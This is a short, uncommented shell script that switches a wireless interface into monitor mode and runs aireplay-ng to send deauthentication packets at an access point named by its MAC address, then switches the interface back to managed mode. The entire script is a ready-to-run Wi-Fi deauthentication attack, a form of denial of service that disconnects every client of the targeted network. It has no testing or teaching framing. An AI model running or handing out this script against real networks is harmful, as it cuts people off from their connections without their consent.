#!/bin/sh

INTERFACE="$1"
TARGET_MAC="$2"

if [ ! -d "/sys/class/net/${INTERFACE}" ]; then
    echo "Network interface ${INTERFACE} not found."
    exit 1
fi

if ! command -v aireplay-ng >/dev/null 2>&1; then
    echo "aircrack-ng not found."
    exit 1
fi

sudo ip link set "${INTERFACE}" down
sudo iw "${INTERFACE}" set monitor control
sudo ip link set "${INTERFACE}" up

sudo aireplay-ng --ignore-negative-one -0 10 -a "${TARGET_MAC}" "${INTERFACE}"

sudo ip link set "${INTERFACE}" down
sudo iw "${INTERFACE}" set type managed
sudo ip link set "${INTERFACE}" up
